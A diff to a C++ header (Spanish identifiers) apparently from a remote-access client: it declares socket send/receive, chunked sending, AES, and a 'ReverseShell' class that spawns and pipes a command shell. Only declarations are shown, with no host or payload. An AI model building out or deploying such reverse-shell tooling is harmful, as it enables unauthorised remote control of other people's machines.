@@ -124,7 +124,8 @@ class Cliente {
 		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
 		int cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
 		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
-		void m_DeserializarPaquete(const char* cBuffer, Paquete& paquete);
+		void m_DeserializarPaquete(const char*& cBuffer, Paquete& paquete);
+		int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete);
 
 
 		//AES
@@ -166,16 +167,16 @@ class Cliente {
 
 class ReverseShell {
 	private:
-		Cliente* copy_ptr;
 		std::mutex mutex_shell;
 		bool isRunning = false;
 		PROCESS_INFORMATION pi;
 		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
 		std::thread tRead;
 	public:
-		ReverseShell(Cliente* nFather) : copy_ptr(nFather) {}
+		ReverseShell(Cliente* nFather) : sckSocket(nFather->sckSocket) {}
 		SOCKET sckSocket;
 		bool SpawnShell(const char* pStrComando);
+		void StopShell();		
 		void TerminarShell();
 
 		void thEscribirShell(std::string pStrInput);
